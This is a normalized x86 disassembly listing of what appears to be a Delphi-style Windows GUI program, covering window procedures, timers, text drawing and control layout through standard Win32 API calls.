inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427a40
retn
sub_427a50
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x7b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
jpe r-xdata
leave
inc ecx
add [ eax ] dl
add al bh
jpe r-xdata
0x41
add [ eax ] bl
add [ eax ] al
in al 0x53
inc ecx
add [ eax ] ch
int3
sub_427c00
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41c504
test bl bl
jle r-xdata
call sub_41d5e0
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_427c34
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_454d24
mov cl 0x1
sub_427c5c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_40339c
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_427c94
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_427cbe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427d2c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_44b71c
mov [ ebp - 0x14 ] eax
call sub_44b638
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_427def
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454614
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_427dc1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427dc8
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_454670
retn
sub_427dc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427df6
mov eax [ ebp - 0x14 ]
call sub_44b7d0
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_44b640
retn
sub_427ecc
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408af0
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_427f67
add [ edi ] cl
add [ eax ] al
add [ eax + 0x3c004597 ] ah
add [ esi ] eax
add [ eax ] al
add [ eax ] al
pushfd
xchg edi eax
inc ebp
add [ ebx + eax + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax + 0x18004597 ] bl
add [ esi ] eax
add [ eax ] al
add [ eax ] al
xchg esp eax
xchg edi eax
inc ebp
add [ esp + eax + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add [ eax + 0x74004597 ] dl
add eax [ esi ]
add [ eax ] al
add [ eax ] al
mov [ edi + 0x3180045 ] ss
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x7ffba69 ] cl
add eax [ esi ]
add [ eax ] al
add [ eax ] al
test [ edi + 0x26c0045 ] dl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x2c004597 ] al
add eax [ esi ]
add [ eax ] al
add [ eax ] al
jl r-xdata
inc ebp
add [ eax + 0x4602 ] dl
add [ eax ] al
add [ eax - 0x69 ] bh
inc ebp
add al ah
add al 0x46
add [ eax ] al
add [ eax ] al
add [ edi + edx * 4 + 0x45 ] al
add [ ecx + eax + 0x46 ] al
add [ eax ] al
inc eax
xchg edi eax
inc ebp
add [ esp + eax + 0x46 ] al
add [ eax ] al
add [ eax ] al
add [ edi + edx * 4 ] bh
inc ebp
add [ eax + 0x4604 ] cl
add [ eax ] al
add [ eax ] bh
xchg edi eax
inc ebp
add al dl
add al [ esi ]
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_428072
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_428079
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0xb
mov edx [ r-xdata ]
call sub_404918
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
sub_42807c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403c70
call sub_427ecc
mov eax [ r-xdata ]
call sub_416354
mov eax [ r-xdata ]
call sub_4163f4
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4163a0
sub_4280bc
or [ ecx + 0x42 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
add [ edx ] 0x0
add [ eax ] al
add [ eax ] al
cmp [ ecx - 0x7ebfffbe ] al
inc edx
add [ eax + eax ] al
add ah ah
push ebx
inc ecx
add [ eax ] ch
int3
sub_429438
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41f9e0
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_420168
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_41f9e0
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_420168
pop ebx
mov esp ebp
pop ebp
retn
sub_4294fc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41faec
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_429438
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_42955c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41c4b8
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_4295e4
call sub_41d604
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4295ac
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_429658
mov eax [ esi + 0x34 ]
call sub_41d6b8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41c504
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_4295e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_42961e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403360
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429658
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4296d7
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4296de
lea eax [ ebp - 0x4 ]
call sub_403e9c
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405c20
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_4038d8
sub_429730
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43d4b8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_42b194
call sub_42b274
test al al
je r-xdata
add esp 0xfffffff0
call sub_403470
mov edx 0xb9
mov eax esi
call sub_4348c8
mov edx 0x29
mov eax esi
call sub_4348ec
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_429b80
mov edx 0x1
mov eax esi
call sub_429b9c
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_4352ac
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_43bb7c
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_4297f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_438774
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_429864
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_43af00
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_438e88
sub_4298a4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_429994
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_43510c
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_439dc4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42999b
lea eax [ ebp - 0x14 ]
call sub_403e9c
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_43b8e8
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_43b8e8
push eax
call InvalidateRect
sub_4299a4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_4299dc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_429b3e
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_4294fc
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_4299a4
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_4294fc
mov esi [ ebx + 0x208 ]
call sub_42b194
call sub_42b274
test al al
je r-xdata
push ebp
call sub_4299a4
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
lea edx [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x208 ]
call sub_4294fc
mov edx [ ebx + 0x70 ]
mov eax [ esi + 0x14 ]
call sub_41fcc0
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_420064
mov eax ebx
call sub_43ca34
test al al
jne r-xdata
mov [ ebp - 0x14 ] edx
add eax edx
mov [ ebp - 0xc ] eax
xor eax eax
mov al [ ebx + 0x220 ]
mov edi [ eax * 4 + rw-data ]
or edi 0x44
mov edx edi
mov eax ebx
call sub_4373e0
mov edi eax
push edi
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_43510c
mov eax [ ebp - 0x1c ]
call sub_40435c
push eax
mov eax esi
call sub_4203c0
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429b45
lea eax [ ebp - 0x1c ]
call sub_403e9c
retn
adc edx 0x0
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_41fddc
mov edx [ ebx + 0x68 ]
mov eax esi
call sub_4202e0
mov edx r-xdata
mov eax esi
call sub_42023c
mov edx [ ebp - 0xc ]
add edx [ ebp - 0x14 ]
sub edx eax
sar edx 0x1
jns r-xdata
sub_429bf0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_437954
mov eax [ ebx + 0x218 ]
neg eax
push eax
mov edx [ ebx + 0x218 ]
neg edx
push eax
push esi
call InflateRect
xor eax eax
cmp [ ebx + 0x212 ] 0x0
je r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
add eax [ ebx + 0x214 ]
mov edx eax
neg edx
push edx
neg eax
push edx
push esi
call InflateRect
pop esi
pop ebx
retn
add eax [ ebx + 0x214 ]
sub_429c48
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43a57c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor edx edx
push ebp
push sub_429d69
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x5b ]
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43a57c
call sub_403984
jmp r-xdata
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4348ec
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4c ] 0x0
jne r-xdata
dec al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
push eax
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
sub ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
dec al
je r-xdata
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4348c8
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x44 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x40 ]
sub edx eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x84 ]
jmp r-xdata
sub_429d84
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov ecx edi
mov edx esi
mov eax ebx
call sub_43c430
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_429db0
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov [ esi + 0x21f ] 0x1
mov edx ebx
mov eax esi
call sub_43ca3c
pop esi
pop ebx
retn
sub_429df0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edi + 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi - 0x60e3ffbe ] bl
inc edx
add [ edx + eax ] bl
add [ eax ] al
inc eax
aam 0x42
add [ eax ] ch
int3
sub_429f54
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_42ed0c
mov edx edi
mov eax [ esi + 0x210 ]
call sub_4169bc
xor edx edx
mov eax edi
call sub_43502c
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_435280
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_42a384
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_429fd8
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_416c5c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_437738
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_42a010
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_42a075
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42f00c
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_42a07a
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_454884
call sub_403954
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a0a0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_43a8cc
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403360
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_42a0e0
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_43a714
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403360
pop edx
pop esi
pop ebx
retn
sub_42a10c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42db8c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403134
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_42a3bc
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403470
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4034c8
pop [ fs : 0x0 ]
add esp 0xc
sub_42a19c
push ebx
push esi
call sub_4034d8
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_42a430
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403164
mov eax [ esi + 0x210 ]
call sub_403164
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43d514
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034c0
sub_42a1ec
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41f508
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42a375
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_43b8e8
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_43502c
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_434b10
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_416b18
mov edi eax
